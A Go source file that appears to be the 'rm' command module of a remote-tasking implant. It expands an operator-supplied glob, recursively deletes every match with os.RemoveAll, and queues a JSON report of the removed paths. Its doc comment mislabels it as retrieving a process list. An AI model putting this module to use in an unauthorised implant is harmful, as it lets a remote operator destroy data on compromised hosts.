package rm

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"pkg/profiles"
	"pkg/utils/structs"
	"strings"
	"sync"
)

var mu sync.Mutex

//Run - interface method that retrieves a process list
func Run(task structs.Task) {
	msg := structs.Response{}
	msg.TaskID = task.TaskID

	files := make([]string, 0)
	if strings.Contains(task.Params, "*") {
		// this means we're trying to glob rm a few things
		potentialFiles, err := filepath.Glob(task.Params)
		if err != nil {
			msg.UserOutput = "Failed to un-glob that path"
			msg.Completed = true
			msg.Status = "error"
			resp, _ := json.Marshal(msg)
			mu.Lock()
			profiles.TaskResponses = append(profiles.TaskResponses, resp)
			mu.Unlock()
			return
		}
		for _, s := range potentialFiles {
			files = append(files, s)
		}
	} else {
		files = append(files, task.Params) // just add our one file
	}
	// now we have our complete list of files/folder to remove
	removedFiles := make([]structs.RmFiles, len(files))
	outputMsg := "Removing files:\n"
	for i, s := range files {
		if _, err := os.Stat(s); os.IsNotExist(err) {
			outputMsg = outputMsg + fmt.Sprintf("File '%s' does not exist.\n", s)
			continue
		}
		err := os.RemoveAll(s)
		if err != nil {
			outputMsg = outputMsg + err.Error()
			continue
		}
		abspath, _ := filepath.Abs(s)
		removedFiles[i].Path = abspath
		removedFiles[i].Host = ""
	}
	outputMsg = outputMsg + "Done"
	msg.Completed = true
	msg.UserOutput = outputMsg
	msg.RemovedFiles = removedFiles
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
